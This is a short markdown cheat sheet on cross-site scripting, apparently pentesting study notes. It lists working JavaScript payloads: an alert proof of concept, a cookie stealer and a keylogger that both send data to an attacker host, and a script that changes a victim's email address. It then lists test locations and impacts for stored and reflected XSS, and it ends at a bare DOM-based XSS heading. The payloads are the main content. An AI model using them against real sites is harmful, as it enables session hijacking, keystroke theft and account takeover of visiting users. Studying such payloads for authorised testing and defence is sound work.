# PoC Payload: <script>alert('XSS');</script>

## Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings

### Session stealing: <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>

### Keylogger: <script>document.onkeypress = function(p){ fetch ('https://hacker.com/log?key=' + btoa(p.key) );}</script>

### Change user's email address: <script>user.changeEmail('attacker@hacker.com');</script>

# Stored XSS

## Test locations: 

#### 1: Comments on a blog

#### 2: User profile information

#### 3: Website listings

## IMPACT:

#### Steal victim's session cookie. Impersonate the visiting user.

# Reflected XSS

## Test locations:

#### 1: URL file path

#### 2: Parameters in the URL query string

#### 3: Sometimes, HTTP headers

## IMPACT:

#### Attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session/customer information.

# DOM Based XSS
